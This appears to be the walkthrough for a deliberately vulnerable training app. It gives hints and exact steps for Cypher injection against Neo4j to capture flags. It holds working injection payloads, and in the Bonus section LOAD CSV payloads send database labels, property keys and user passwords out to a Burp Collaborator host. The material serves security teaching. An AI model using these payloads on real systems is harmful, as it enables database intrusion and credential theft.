## Neo4j 

In part, this application tests your knowledge of Neo4j and Cypher Query Language. Below you will find hints and steps for full walkthroughs. 

### EASY

<details>
  <summary>Hints</summary>

  1. Can you modify the request before it gets sent to server?
  2. Can you modify the request so the application displays an error with the Cypher query? 
  3. Can you modify the request to include the Cypher equivalent to sql injection's ```x' or 'x'='x```?
</details>

<details>
  <summary>Walkthrough</summary>

  1. Browse to the Neo4j page of the app.
  2. Using Burp or ZAP, intercept your request after clicking "go" on the app's Neo4j page.
  3. Edit ```person=Tom+Hanks``` to ```person=xxxxx"``` in the request body.
  4. Forward the request.
  5. Back in your browser, observe the query in the error message.
  6. Send another request and intercept it.
  7. Edit the request: Change ```person=Tom+Hanks`` to ```person=Tom+Hanks" or person.name=~".*```.
  8. Forward the request.
  9. Back in your browser look for the FLAGs.
</details>

## Neo4j MEDIUM 

<details>
  <summary>Hints</summary>

  1. Modify the request so the application displays an error with the Cypher query. 
  2. The payload here depends on understanding Cypher Query Language as well as understanding how application code might rely on variable names used in the ```return`` portion of the query. 
</details>

<details>
  <summary>Walkthrough</summary>

  There are multiple ways to get the flags at this level, one of which does not require Cypher Injection; below is one that does, and requires some knowledge of Neo4j and Cypher Query Language.

  1. Browse to the Neo4j page of the app.
  2. Select something in the second dropdown.
  3. Using Burp or ZAP, intercept your request after clicking "go" on the app's Neo4j page.
  4. Edit ```person=Tom+Hanks``` to ```person=Tom+Hanks"``` in the request body.
  5. Forward the request.
  6. Back in your browser, observe the query in the error message.
  7. Send another request and intercept it.
  8. Edit the request: Change ```person=Tom+Hanks`` to ```person=Tom+Hanks"})-[role]-(movie) return person,role,movie//```.
  9. Create a text file containing the list of names from the select dropdown.
  10. Use Burp intruder to replace ```Tom+Hanks``` with the names from the file. 
  11. Find results in intruder that contain the text FLAG.
</details>

## Neo4j HARD

## Neo4j BONUS  

<details>
  <summary>Hints</summary>

  1. To get the BONUS flags, you will need either:
    * Your own webserver where you may monitor access logs 
    * [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) 
  2. You will need to understand how to use [Neo4j's db.labels() and db.propertyKeys() procedures](https://Neo4j.com/docs/cypher-manual/current/clauses/call/) to map this database.
  3. You will need to understand how to use [Neo4j's LOAD CSV functionality](https://Neo4j.com/developer/guide-import-csv/) to cause Neo4j to make http requests.
  4. You will need to understand how to use the two together to [extract information from Neo4j](https://www.sidechannel.blog/en/the-cypher-injection-saga/).
</details>

<details>
  <summary>More Hints</summary>

You need [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client), which is sadly only available with Burpsuite Pro, or your own webserver where you are able to see HTTP access requests. You could add a basic webserver container to this set up and use that server's IP address and access logs in place of Burp Collaborator.

1. Set your challenge level to Medium
2. Get list of all labels in the database and look for something interesting

```
person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2blabel+AS+r+return+person//&search=go
person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

3. Get list of all properties in the database and look for something interesting

```
person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bpropertyKey+AS+r+return+person//&search=go
person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

4. Try variations of the following payload, replacing LABEL with an actual label and PROPERTY with an actual property from steps 1 & 2. This will tell you what properties go with what labels - if no error is thrown you have a property matched to a label.

```
person=Christian+Bale"})-[role]->(node:LABEL)+RETURN+person,role,node.PROPERTY&role=DIRECTED&search=go
```

For example, this should throw an error

```
person=Christian+Bale"})-[role]->(node:Person)+RETURN+person,role,node.title&role=DIRECTED&search=go
```

And this should not throw an error, but you won't see the data for ```node.title``` because of the code that's printing data to the screen

```
person=Christian+Bale"})-[role]->(node:Movie)+RETURN+person,role,node.title&role=DIRECTED&search=go
```

5. Once you've decided what LABEL and PROPERTY you are interested in, use the following payload, foreach person in the database, replacing LABEL with the label and PROPERTY with the property and watch your collaborator space or your server access logs. 

```
person=Tom+Cruise"})-[role]->(node:LABEL)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.name%2b'/'%2bnode.PROPERTY+AS+r+return+person//&search=go//&role=DIRECTED&search=go
```

For example

```
person=Tom+Cruise"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
```

6. Some of the flags may need to be further figured out.
</details>


<details>
  <summary>Exact steps to FLAGS</summary>

You need [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client), which is sadly only available with Burpsuite Pro, or your own webserver where you are able to see HTTP access requests. You could add a basic webserver container to this set up and use that server's IP address and access logs in place of Burp Collaborator.


1. Set your challenge level to Medium
2. Get a list of all labels in the database - you are looking for the ```User``` label.

```
person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2blabel+AS+r+return+person//&search=go
person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

3. Get list of all properties in the database - you are looking for the ```password``` label. 

```
person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bpropertyKey+AS+r+return+person//&search=go
person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

4. Use the following payloads to get the BONUS flags.

```
person=Tom+Tykwer"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go

person=Tom+Cruise"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go

person=Tom+Skerritt"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
```
5. The BONUS^MEDIUM password is base64 encoded 3x. 
6. The BONUS^HARD password is encoded using Ceasar Cipher then converted to asciihex then base64 encoded.
</details>
